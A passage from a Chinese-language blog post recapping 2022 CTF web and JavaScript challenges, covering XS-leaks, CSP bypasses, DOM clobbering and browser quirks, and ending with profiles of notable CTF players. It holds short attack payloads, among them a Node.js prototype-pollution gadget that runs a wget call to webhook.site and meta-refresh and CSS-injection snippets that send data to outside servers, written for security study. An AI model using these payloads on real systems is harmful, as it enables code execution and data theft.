        <span class="token punctuation">)</span>
    <span class="token punctuation">)</span><span class="token punctuation">,</span> o
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有一個很明顯的 prototype pollution，要做到 RCE。</p>
<p>這邊有一篇很棒的論文可以參考：<a target="_blank" rel="noopener" href="https://arxiv.org/abs/2207.11171">Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js</a></p>
<p>但論文裡面提到的 gadget 被修掉了，要自己再找一個，結果如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token literal-property property">exports</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token string-property property">"."</span><span class="token operator">:</span> <span class="token string">"./preinstall.js"</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'./usage'</span>
<span class="token punctuation">&#125;</span>
<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'/opt/yarn-v1.22.19'</span>
<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>shell <span class="token operator">=</span> <span class="token string">"node"</span>
<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span><span class="token string">"npm_config_global"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>env <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token string-property property">"NODE_DEBUG"</span><span class="token operator">:</span> <span class="token string">"console.log(require('child_process').execSync('wget$&#123;IFS&#125;https://webhook.site?q=2').toString());process.exit()//"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"NODE_OPTIONS"</span><span class="token operator">:</span> <span class="token string">"--require=/proc/self/environ"</span>
<span class="token punctuation">&#125;</span>

<span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./usage.js'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>細節可以看完整 writeup：<a href="https://blog.huli.tw/2022/12/08/ctf-js-notes#balsn-ctf-2022-2linenodejs">https://blog.huli.tw/2022/12/08/ctf-js-notes#balsn-ctf-2022-2linenodejs</a></p>
<h2><span id="xsleaks">XSleaks</span></h2><h3><span id="dicectf-2022-carrot">DiceCTF 2022 - carrot</span></h3><p>這題簡單來說就是利用 <a target="_blank" rel="noopener" href="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/">connection pool</a> 來測量 response time。</p>
<p>你可能會想說測量 response time 有什麼難的，fetch 外加自己算一下不就好了嗎？但如果有 SameSite cookie 的話，fetch 是無法使用的，這時候就需要用到一些 XSleaks 的小技巧來測量時間。</p>
<p>在 Chrome 裡面 socket 數量是有上限的，一般是 255，headless 是 99，假設我們先把 socket 消耗到只剩下一個，這時候我去造訪我想測量時間的 URL（叫做 reqSearch），與此同時發另一個 request 到我們自己的 server（叫做 reqMeasure）。</p>
<p>由於 socket 只剩一個，所以 reqMeasure 從發出 request 到收到 response 的時間，就是 <code>reqSearch 花的時間 + reqMeasure 花的時間</code>，假設 reqMeasure 花的時間都差不多，那我們很容易可以測量出 reqSearch 花的時間。</p>
<p>詳細 writeup：<a href="https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#webcarrot1-solves">https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#webcarrot1-solves</a></p>
<h3><span id="tsj-ctf-2022-nim-notes">TSJ CTF 2022 - Nim Notes</span></h3><p>這題你可以做到 CRLF injection，但是位置在最底下，所以沒辦法覆蓋 CSP 也無法 XSS，要怎麼偷到頁面的內容？</p>
<p>假設要偷的內容在 <code>&lt;script&gt;</code> 裡面，可以利用 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only">Content-Security-Policy-Report-Only</a> 這個 header，因為違反規時會發送一段 JSON 到指定位置，其中會包含 scripe 的前 40 個字元。</p>
<p>完整 writeup：<a href="https://blog.huli.tw/2022/03/02/tsj-ctf-2022-nim-notes/">https://blog.huli.tw/2022/03/02/tsj-ctf-2022-nim-notes/</a></p>
<h3><span id="ångstromctf-2022-sustenance">ångstromCTF 2022 - Sustenance</span></h3><p>有一個搜尋功能，成功跟失敗的差別在於網址不同。</p>
<p>例如說成功是：<code>/?m=your search...at 1651732982748 has success....</code>，失敗是：<code>/?m=your search...at 1651732982748 has failed</code></p>
<p>解法兩個，一個是利用 response 會 cache 的這點用 fetch 去測量是否有在 cache 內。雖然說 Chrome 有實裝 Cache parition 了，但是 headless 還沒。</p>
<p>第二個是利用其他 same site domain 做 cookie tossing，就可以構造出一個 cookie bomb，當搜尋成功的時候 payload 會太大（因為網址多了幾個字元），失敗的時候就沒事，藉此測量出差異。</p>
<p>完整 writeup：<a href="https://blog.huli.tw/2022/05/05/angstrom-ctf-2022-writeup/#websustenance">https://blog.huli.tw/2022/05/05/angstrom-ctf-2022-writeup/#websustenance</a></p>
<h3><span id="justctf-2022-ninja">justCTF 2022 - Ninja</span></h3><p>新的 xsleak，利用 <code>:target</code> 搭配 <code>:before</code> 來載入圖片。</p>
<p>細節可參考：<a target="_blank" rel="noopener" href="https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/">New technique of stealing data using CSS and Scroll-to-Text Fragment feature.</a></p>
<p>完整 writeup：<a href="https://blog.huli.tw/2022/06/14/justctf-2022-writeup#ninja1-solves">https://blog.huli.tw/2022/06/14/justctf-2022-writeup#ninja1-solves</a></p>
<h3><span id="sekaictf-2022-safelist">SekaiCTF 2022 - safelist</span></h3><p>利用 lazy-loading image 發 request 給 server 來拖慢 server 速度，就可以藉由 timing attack 得知圖片是否載入。</p>
<p>也可以利用前面提到的 connection pool 或是其他元素來解。</p>
<p>writeup：<a href="https://blog.huli.tw/2022/10/08/sekaictf2022-safelist-and-connection/">https://blog.huli.tw/2022/10/08/sekaictf2022-safelist-and-connection/</a></p>
<h2><span id="前端-domx2fbom-相關知識">前端 DOM&#x2F;BOM 相關知識</span></h2><h3><span id="dicectf-2022-shadow">DiceCTF 2022 - shadow</span></h3><p>這題的核心在於如何拿到 shadowDOM 裡的東西，更完整的研究在這：<a target="_blank" rel="noopener" href="https://blog.ankursundara.com/shadow-dom/">The Closed Shadow DOM</a></p>
<p>但總之最後的解法是：</p>
<ol>
<li>設置 CSS <code>-webkit-user-modify</code> 屬性，效果跟 <code>contenteditable</code> 差不多</li>
<li>用 <code>window.find</code> 去 docus 內容</li>
<li>利用 <code>document.execCommand</code> 插入 HTML，並用 svg 拿到節點</li>
</ol>
<p>詳細 writeup：<a href="https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#webshadow0-solves">https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#webshadow0-solves</a></p>
<h3><span id="line-ctf-2022-haribote-secure-note">LINE CTF 2022 - Haribote Secure Note</span></h3><p>這題有兩個注入點，第一個在 script 裡面，可以控制 16 個字元，第二個則是 HTML injection，而最大的問題是 CSP 很嚴格：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>default-src 'self'; style-src 'unsafe-inline'; object-src 'none'; base-uri 'none'; script-src 'nonce-&#123;&#123; csp_nonce &#125;&#125;'
    'unsafe-inline'; require-trusted-types-for 'script'; trusted-types default<span class="token punctuation">"</span></span>
          <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>解法有三個：</p>
<ol>
<li>神奇的 <a target="_blank" rel="noopener" href="https://www.w3.org/TR/2011/WD-html5-20110405/tokenization.html#script-data-double-escaped-state">script data double escaped state</a></li>
<li><code>import()</code> 不會被 Trusted Types 擋住</li>
<li>用 <code>&lt;iframe src=&#39;/p&#39;&gt;</code> 在其他頁面執行程式碼繞過 CSP</li>
</ol>
<p>順便附上一篇很棒的文章：<a target="_blank" rel="noopener" href="https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types">Eliminating XSS from WebUI with Trusted Types</a></p>
<p>完整 writeup：<a href="https://blog.huli.tw/2022/03/27/linectf-2022-writeup/#haribote-secure-note7-solves">https://blog.huli.tw/2022/03/27/linectf-2022-writeup/#haribote-secure-note7-solves</a></p>
<h3><span id="m0lecon-ctf-2022-ptmd">m0leCon CTF 2022 - ptMD</span></h3><p>利用 <code>meta</code> 組合技洩漏網址：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>referrer<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>unsafe-url<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>refresh<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3;url=https://webhook.site/d485f13a-fd8b-4cfd-ad13-63d9b0f1f5ef<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>在 CSP 很嚴格的狀態下，meta 可以作為一個突破的技巧。像上面這些 meta 不用放在 head 裡面也有作用，甚至移除掉之後也有用。</p>
<p>完整 writeup：<a href="https://blog.huli.tw/2022/05/21/m0lecon-ctf-2022-writeup#ptmd">https://blog.huli.tw/2022/05/21/m0lecon-ctf-2022-writeup#ptmd</a></p>
<h3><span id="corctf-2022-modernblog">corCTF 2022 - modernblog</span></h3><p>這題是一個 React app，會用 <code>dangerouslySetInnerHTML</code> render 你的東西，也就是說你得到一個 HTML injection。</p>
<p>但 CSP 不讓你執行 script：<code>script-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;</code></p>
<p>你要偷的是有 flag ID 的網址，這個網址會出現在 <code>/home</code> 頁面，如果我們可以在那個頁面做 CSS injection，就可以這樣偷：</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">a[href^="/post/0"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>//myserver?c=0<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">a[href^="/post/1"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>//myserver?c=1<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

// ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>而我們現在在的是 <code>/posts/:id</code> 頁面，所以沒辦法拿到 <code>/home</code> 頁面的內容，自然也就不能這樣做。</p>
<p>這題的關鍵點是一個很有趣的 DOM clobbering 應用，現在 React app 基本上都是用 <a target="_blank" rel="noopener" href="https://reactrouter.com/en/main">react-router</a> 這個 lib 來做路由的，這個 lib 裡面會去拿 <code>document.defaultView.history</code>，去看網址是什麼，來決定 render 哪個頁面。</p>
<p>而 <code>document.defaultView</code> 可以被 DOM clobbering 影響，像這樣：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>defaultView</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>/home</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如此一來，<code>document.defaultView.history</code> 就變成了 <code>/home</code>，因此，我們只要用 iframe srcdoc 就可以在 React app 裡面再渲染一個 React app，並且用前面提過的 CSS injection 把 flag id 拿出來：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;iframe srcdoc="
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>defaultView</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>/home</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
    <span class="token selector">a[href^="/post/0"]</span> <span class="token punctuation">&#123;</span>
      <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>//myserver?c=0<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token selector">a[href^="/post/1"]</span> <span class="token punctuation">&#123;</span>
      <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>//myserver?c=1<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>

  react app below<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>module</span> <span class="token attr-name">crossorigin</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>/assets/index.7352e15a.js</span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
" height="1000px" width="500px"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我之前寫過的英文 writeup：<a href="https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/">https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/</a></p>
<h3><span id="hitcon-ctf-2022-self-destruct-message">HITCON CTF 2022 - Self Destruct Message</span></h3><p>原本在用 <code>element.innerHTML = str</code> 的時候都是非同步的，但利用神奇的 <code>&lt;svg&gt;&lt;svg&gt;</code> 即可做到同步：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">const div = document.createElement('div')
div.innerHTML = '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>'
console.log(2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>會先輸出 1 再來 2，而且不用插到 DOM 就會生效。</p>
<p>相關討論可以看：<a target="_blank" rel="noopener" href="https://twitter.com/terjanq/status/1421093136022048775">https://twitter.com/terjanq/status/1421093136022048775</a></p>
<p>writeup：<a href="https://blog.huli.tw/2022/12/08/ctf-js-notes/#hitcon-ctf-2022">https://blog.huli.tw/2022/12/08/ctf-js-notes/#hitcon-ctf-2022</a></p>
<h3><span id="sekaictf-2022-obligatory-calc">SekaiCTF 2022 - Obligatory Calc</span></h3><p>兩個重點：</p>
<ol>
<li>onmessage 裡面的 <code>e.source</code> 是發送訊息的來源 window，雖然乍看之下一定是物件，但如果 postMessage 之後立刻關閉，就會變成 null</li>
<li>在 sandbox iframe 底下，存取 <code>document.cookie</code> 會發生錯誤</li>
</ol>
<h2><span id="瀏覽器內部運作相關">瀏覽器內部運作相關</span></h2><h3><span id="googlectf-2022-postviewer">GoogleCTF 2022 - POSTVIEWER</span></h3><p>這題跟瀏覽器在執行東西時的順序有關，也跟 site isolation 之類的有關，透過這些東西就可以構造出一個 iframe 相關的 race condition。</p>
<p>完整 writeup：<a href="https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/#postviewer-10-solves">https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/#postviewer-10-solves</a></p>
<h3><span id="uiuctf-2022-modernism">UIUCTF 2022 - modernism</span></h3><p>程式碼很簡單：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token punctuation">,</span> request
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    prefix <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    flag <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">"uiuctf&#123;FAKEFLAG&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#^uiuctf&#123;[A-Za-z]+&#125;$</span>
    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>prefix<span class="token operator">+</span>flag<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">"text/plain"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>把你給的東西加上 flag 之後輸出，雖然 mime type 是 <code>text/plain</code>，但因為沒有加上 <code>X-Content-Type-Options: nosniff</code>，所以還是可以用 <code>&lt;script&gt;</code> 來載入這一段。</p>
<p>但因為 flag 裡面有 <code>&#123;&#125;</code> 所以沒辦法輕易弄成可以被執行的腳本（會一直出現 syntax error）</p>
<p>解法是前面加上 BOM，瀏覽器就會把整個腳本用 UTF-16 去讀，flag 就會變奇怪的中文字就不會壞了，要放的內容是 <code>++window.</code>，接著去看 window 的哪個屬性被改變就好了。</p>
<p>這題的解法基本上要知道瀏覽器怎麼去讀才能解。</p>
<p>完整 writeup：<a href="https://blog.huli.tw/2022/08/01/uiuctf-2022-writeup/">https://blog.huli.tw/2022/08/01/uiuctf-2022-writeup/</a></p>
<h3><span id="uiuctf-2022-precisionism">UIUCTF 2022 - precisionism</span></h3><p>上一題的延伸，只是結尾加上了<code>Enjoy your flag!</code>，因為這個結尾所以上面提過的招數不能用了。</p>
<p>預期解法是把 response 弄成 ICO 格式，把要 leak 的部分放到 width 去，然後 cross origin 拿圖片寬度是可以的，就可以一個 byte 一個 byte 把資料拿出來。</p>
<p>完整 writeup：<a href="https://blog.huli.tw/2022/08/01/uiuctf-2022-writeup#precisionism3-solves">https://blog.huli.tw/2022/08/01/uiuctf-2022-writeup#precisionism3-solves</a></p>
<h3><span id="seccon-ctf-2022-quals-spanote">SECCON CTF 2022 Quals - spanote</span></h3><p>這題利用了 bfcache 這個東西：<a target="_blank" rel="noopener" href="https://web.dev/i18n/en/bfcache/">https://web.dev/i18n/en/bfcache/</a></p>
<p>假設有個 API 長這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">fastify<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/api/notes/:noteId"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> reply</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>session<span class="token punctuation">.</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"x-token"</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token function">hash</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Invalid token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">const</span> noteId <span class="token operator">=</span> <span class="token function">validate</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>params<span class="token punctuation">.</span>noteId<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> user<span class="token punctuation">.</span><span class="token function">sendNote</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> noteId<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>雖然是個 GET，但是會檢查 custom header，因此照理來說直接用瀏覽器訪問是看不了的。</p>
<p>但利用 bfcache，可以這樣解：</p>
<ol>
<li>用瀏覽器打開 <code>/api/notes/id</code>，出現錯誤畫面</li>
<li>用同一個 tab 去到首頁，此時首頁會用 fetch 搭配 custom header 去抓 <code>/api/notes/id</code>，瀏覽器會把結果存在 disk cache 內</li>
<li>上一頁，此時畫面會顯示 disk cache 的結果</li>
</ol>
<p>就可以用瀏覽器直接瀏覽 cached response，繞過了 custom header 的限制。</p>
<p>完整 writeup：<a href="https://blog.huli.tw/2022/12/08/ctf-js-notes/#seccon-ctf-2022-quals-spanote">https://blog.huli.tw/2022/12/08/ctf-js-notes/#seccon-ctf-2022-quals-spanote</a></p>
<h2><span id="特別加映人物介紹">特別加映：人物介紹</span></h2><p>原本就有幾個人令我印象特別深刻，想說既然都整理了題目，順便整理一下這些人好了。</p>
<p>第一位是 <a target="_blank" rel="noopener" href="https://twitter.com/ankursundara">Ankur Sundara</a>，隸屬於 dicegang 戰隊，上面 UIUCTF 的題目是他出的，之前解了一題跟 content type 有關的題目也是他出的，感覺應該是把 Chromium source code 相關部分看了一遍才產出那些題目。</p>
<p>另外這篇對 Shadow DOM 的研究也是他寫的：<a target="_blank" rel="noopener" href="https://blog.ankursundara.com/shadow-dom/">The Closed Shadow DOM</a></p>
<p>第二位是 <a target="_blank" rel="noopener" href="https://twitter.com/terjanq">terjanq</a>，在 Google 上班，上面講到的 GoogleCTF race condition 那題是他出的，以前也出過一堆經典題目，XSleak wiki 是他維護的，總覺得在跟瀏覽器有關的行為這塊沒什麼他不會的…</p>
<p>偶爾會跟著 justCatTheFish 戰隊一起打 CTF，如果有些前端 Web 題只有一兩隊解出來，高機率 justCatTheFish 是其中一隊。</p>
<p>第三位是 <a target="_blank" rel="noopener" href="https://twitter.com/Strellic_">strellic</a>，也來自於 dicegang，出了一堆題目而且品質都很好，writeup 也寫得很詳細，從他那邊學到很多技巧跟新的想法，總是能結合以前的技巧然後發展出新的手法，真的很厲害。</p>
<p>除了這些當然還有其他印象深刻的人，但就懶得一一介紹了XD </p>
<p>像是開頭提到的文章作者 <a target="_blank" rel="noopener" href="https://twitter.com/arkark_">@arkark_</a>、出了讓我到現在還驚艷的一題的 <a target="_blank" rel="noopener" href="https://twitter.com/zwad3">@zwad3</a>、解出難題的常客 <a target="_blank" rel="noopener" href="https://twitter.com/parrot409">@parrot409</a> 以及 <a target="_blank" rel="noopener" href="https://twitter.com/maple3142">@maple3142</a>，都很常看到他們活躍在 CTF 中。</p>
<h2><span id="總結">總結</span></h2><p>整理過後發現自己還打過滿多題目的（雖然很多都沒解出來就是了），而有些題目雖然概念不難，但要實作起來也是滿麻煩的。</p>
<p>另外，可以發現有不少題目需要去看到 lib 的 source code 才有辦法解，我個人是滿喜歡這種題目的，就有種 real world 的感覺吧，平時在用的東西但你其實不知道它背後是怎麼運作的，藉由 CTF 強迫你去理解它。雖然與 Web 無關，但今年也出現了兩三次跟 Git 有關的題目，也都是需要去理解 Git 背後的運作才能解。</p>
<p>今年學到了很多以前完全不知道的技巧，覺得自己對於 JS 跟瀏覽器的理解又上升了一點，但可以預見的是明年一定還是被電，還是會出現更多以前不知道的東西。</p>
<p>最後也要感謝一下每個出題者，是因為有這些出題者藉由題目分享自己的研究，才能讓其他人學到這些新穎的技巧。我自己認為出一個好的題目比解題還要難，解題的話你知道一定會有答案在那邊，只要找到答案就好。而出題如果要出的好，你要自己先去發現一個新的東西，這個真的難，再次對每個出題者致上敬意。</p>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2023/01/10/security-of-encrypt-or-hash-password-in-client-side/">網站前端打 API 時把密碼加密，有意義嗎？</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2022/12/14/rctf-2022-writeup/">RCTF 2022 筆記</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">評論</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2023 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>繁體中文</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2022/12/26/en/ctf-2022-web-js-summary/" class="dropdown-item">
                    English
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
